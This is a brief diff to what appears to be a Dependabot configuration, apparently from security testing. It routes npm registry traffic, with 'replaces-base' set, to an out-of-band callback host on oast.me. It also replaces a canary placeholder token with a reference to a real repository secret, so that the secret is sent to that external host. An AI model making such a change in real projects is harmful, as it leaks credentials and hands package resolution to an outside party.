@@ -3,7 +3,7 @@ registries:
   oob:
     type: npm-registry
     url: https://d8il11igp7giad5pmv60jfy6h47qudqie.oast.me/npmreg
-    token: CANARY-CFG-TOKEN-9ZQ7
+    token: ${{secrets.NPM_OOB_TOKEN}}
     replaces-base: true
 updates:
   - package-ecosystem: npm
